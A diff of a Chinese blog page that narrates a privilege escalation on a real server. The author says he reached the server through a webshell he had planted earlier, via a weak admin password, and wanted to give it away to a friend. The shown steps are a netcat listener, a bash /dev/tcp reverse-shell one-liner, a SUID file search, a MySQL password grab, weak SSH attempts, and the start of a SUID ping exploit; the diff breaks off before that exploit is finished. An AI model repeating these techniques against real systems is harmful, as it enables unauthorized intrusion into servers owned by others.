@@ -8,12 +8,13 @@
   <link rel="dns-prefetch" href="http://yoursite.com">
   <title>记一次曲折的Linux提权 | Hit0n&#39;s bolg</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="本文首发于合天智汇0X01 前言最近一个小老弟问我有没有闲置的服务器，windows倒是有几台，但是小老弟是Linux系统管理员不熟悉windows，翻翻我的webshell找到了一两台Linux不过权限都很低，想着怎么着也要把它给提下来吧（吃了人家一顿饭 嘿嘿）于是就有了本文，也GET到了新的提权姿势。 0X02 正文shell怎么拿到的不详说，弱口令后台getshell。使用命令whoami查">
+  <meta name="description" content="本文首发于合天智汇0X01 前言最近一个小老弟问我有没有闲置的服务器，windows倒是有几台，但是小老弟是Linux系统管理员不熟悉windows，翻翻我的webshell找到了一两台Linux不过权限都很低，想着怎么着也要把它给提下来吧（吃了人家一顿饭 嘿嘿）于是就有了本文，也GET到了新的提权姿势。">
+<meta name="keywords" content="实战,提权">
 <meta property="og:type" content="article">
 <meta property="og:title" content="记一次曲折的Linux提权">
-<meta property="og:url" content="http://yoursite.com/2018/10/19/记一次曲折的Linux提权/index.html">
+<meta property="og:url" content="http://yoursite.com/2018/11/07/记一次曲折的Linux提权/index.html">
 <meta property="og:site_name" content="Hit0n&#39;s bolg">
-<meta property="og:description" content="本文首发于合天智汇0X01 前言最近一个小老弟问我有没有闲置的服务器，windows倒是有几台，但是小老弟是Linux系统管理员不熟悉windows，翻翻我的webshell找到了一两台Linux不过权限都很低，想着怎么着也要把它给提下来吧（吃了人家一顿饭 嘿嘿）于是就有了本文，也GET到了新的提权姿势。 0X02 正文shell怎么拿到的不详说，弱口令后台getshell。使用命令whoami查">
+<meta property="og:description" content="本文首发于合天智汇0X01 前言最近一个小老弟问我有没有闲置的服务器，windows倒是有几台，但是小老弟是Linux系统管理员不熟悉windows，翻翻我的webshell找到了一两台Linux不过权限都很低，想着怎么着也要把它给提下来吧（吃了人家一顿饭 嘿嘿）于是就有了本文，也GET到了新的提权姿势。">
 <meta property="og:locale" content="zh">
 <meta property="og:image" content="https://i.imgur.com/NfrGeTP.png">
 <meta property="og:image" content="https://i.imgur.com/mvrofpD.png">
@@ -24,10 +25,10 @@
 <meta property="og:image" content="https://i.imgur.com/2KMM7xU.png">
 <meta property="og:image" content="https://i.imgur.com/qed9M4c.png">
 <meta property="og:image" content="https://i.imgur.com/vKM7IPD.png">
-<meta property="og:updated_time" content="2018-11-07T13:32:46.259Z">
+<meta property="og:updated_time" content="2018-11-12T08:48:48.075Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="记一次曲折的Linux提权">
-<meta name="twitter:description" content="本文首发于合天智汇0X01 前言最近一个小老弟问我有没有闲置的服务器，windows倒是有几台，但是小老弟是Linux系统管理员不熟悉windows，翻翻我的webshell找到了一两台Linux不过权限都很低，想着怎么着也要把它给提下来吧（吃了人家一顿饭 嘿嘿）于是就有了本文，也GET到了新的提权姿势。 0X02 正文shell怎么拿到的不详说，弱口令后台getshell。使用命令whoami查">
+<meta name="twitter:description" content="本文首发于合天智汇0X01 前言最近一个小老弟问我有没有闲置的服务器，windows倒是有几台，但是小老弟是Linux系统管理员不熟悉windows，翻翻我的webshell找到了一两台Linux不过权限都很低，想着怎么着也要把它给提下来吧（吃了人家一顿饭 嘿嘿）于是就有了本文，也GET到了新的提权姿势。">
 <meta name="twitter:image" content="https://i.imgur.com/NfrGeTP.png">
   
     <link rel="alternative" href="/atom.xml" title="Hit0n&#39;s bolg" type="application/atom+xml">
@@ -164,15 +165,36 @@
   
 
         
-        <a href="/2018/10/19/记一次曲折的Linux提权/" class="archive-article-date">
-  	<time datetime="2018-10-19T07:32:42.350Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-19</time>
+        <a href="/2018/11/07/记一次曲折的Linux提权/" class="archive-article-date">
+  	<time datetime="2018-11-06T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-07</time>
 </a>
+		
+          <div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <span class="post-count">1.1k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">4分</span>
+      </span>
+    </span>
+</div>
+          
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
         <h3 id="本文首发于合天智汇"><a href="#本文首发于合天智汇" class="headerlink" title="本文首发于合天智汇"></a>本文首发于合天智汇</h3><h2 id="0X01-前言"><a href="#0X01-前言" class="headerlink" title="0X01 前言"></a>0X01 前言</h2><p>最近一个小老弟问我有没有闲置的服务器，windows倒是有几台，但是小老弟是Linux系统管理员不熟悉windows，翻翻我的webshell找到了一两台Linux不过权限都很低，想着怎么着也要把它给提下来吧（吃了人家一顿饭 嘿嘿）于是就有了本文，也GET到了新的提权姿势。</p>
+<a id="more"></a>
 <h2 id="0X02-正文"><a href="#0X02-正文" class="headerlink" title="0X02 正文"></a>0X02 正文</h2><p>shell怎么拿到的不详说，弱口令后台getshell。使用命令<code>whoami</code>查看当前权限。发现是<em>nobody</em>权限。nobody在linux中是一个不能登陆的帐号，一些服务进程如apache，aquid等都采用一些特殊的帐号来运行，比如nobody,news,games等等，这是就可以防止程序本身有安全问题的时候，不会被黑客获得root权限。<br><img src="https://i.imgur.com/NfrGeTP.png" alt=""><br><br><br>说道Linux提权最先想到的肯定是利用利用内核漏洞找到对应版本相应的exp直接进行溢出提权。<br><br>首先使用命令<code>uname -a</code>查看当前操作系统版本。发现是<code>2.6.18-194.17.1.el5</code><br><img src="https://i.imgur.com/mvrofpD.png" alt=""><br><br>比较老了，心里想着这还不分分钟给你提下来。linux提权首先的获取到一个交互式的shell。有好几种方法可以实现，这里我用的是bash法。首先在你vps上监听一个端口使用命令<code>nc -lvp port</code>即可，然后在webshell上执行<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>获取到反弹回来的shell。<br><img src="https://i.imgur.com/RB1Xwn5.png" alt=""><br><br><img src="https://i.imgur.com/JDd2ymA.png" alt=""><br><br>查找当前系统可使用的exp，上传，给权限，gcc编译，执行，一条龙操作。不过这个过程可能会遇到各种问题。受害主机可能没有装gcc，gcc编译提示缺少库，能执行却依旧提升不了权限。反正我是各种exp用尽然而还是提不下来。<br><br>转换思路，发现受害主机使用的是MySQL，于是一通乱翻终于找到了MySQL密码，想利用MySQL udf提权，不过之前Linux下udf提权一直没尝试过，而且网上关于这方面的文章很少还基本都长一个样，遂放弃。<br><img src="https://i.imgur.com/Fx7R4fm.png" alt=""><br><br>MySQL密码其实挺简单的，我就想着数据库密码都这么简单，会不会ssh也是个弱口令了，尝试去连接，不能直连，遂放弃。<br><img src="https://i.imgur.com/UJGljBj.png" alt=""><br><br>passwd shadow 文件也没权限读。怎么办？？各种搜索，发现还有一招SUID提权法。网上关于这方面的文章也比较少。SUID是Linux的一种权限机制，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。如果拥有SUID权限，那么就可以利用系统中的二进制文件和工具来进行root提权。首先要找到系统里使用SUID的文件，使用命令<code>find / -perm -u=s -type f 2&gt;/dev/null</code> <img src="https://i.imgur.com/2KMM7xU.png" alt=""><br><br>可以看到这么多文件都是都是带SUID 标识符的。这里我们使用ping。</p>
 <p>操作步骤如下（来自博客 <a href="https://blog.csdn.net/fffygapl/article/details/51783346）" target="_blank" rel="noopener">https://blog.csdn.net/fffygapl/article/details/51783346）</a></p>
 <p>切换到tmp目录<br>cd /tmp</p>
@@ -221,6 +243,21 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">实战</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">提权</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -271,7 +308,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2018/10/19/记一次曲折的Linux提权/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2018/11/07/记一次曲折的Linux提权/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -285,18 +322,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2018/10/25/PHP代码审计之piwigo SQL injection（in_array()函数缺陷）/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2018/11/11/CmsExploit_framework编写（一）/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          PHP代码审计之piwigo SQL injection（in_array()函数缺陷）
+          CmsExploit_Framework编写（一）
         
       </div>
     </a>
   
   
-    <a href="/2018/09/21/记一次实战渗透过程中的知识点总结/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">记一次实战渗透过程中的知识点总结</div>
+    <a href="/2018/10/28/python url采集 + exp批量测试/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">python url采集 + exp批量测试</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -420,6 +457,30 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
             <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
           </label>
           <ul class="article-tag-list" q-show="showTags">
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">代码审计</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">总结</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">实战</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">提权</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">内网</a>
+              </li>
             
             <div class="clearfix"></div>
           </ul>
